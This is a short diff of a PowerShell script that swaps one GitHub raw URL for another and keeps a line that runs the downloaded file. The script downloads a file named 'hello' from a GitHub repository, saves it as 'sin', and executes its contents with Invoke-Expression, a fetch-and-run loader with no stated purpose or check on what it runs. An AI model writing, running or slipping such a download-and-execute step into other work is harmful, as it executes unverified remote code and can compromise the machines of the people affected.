@@ -1,3 +1,3 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Desezutt/pupupu/main/hello" -OutFile "sin"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NotiLo-A/ArduPM/main/hello" -OutFile "sin"
 
 Invoke-Expression (Get-Content -Path "sin" -Raw)
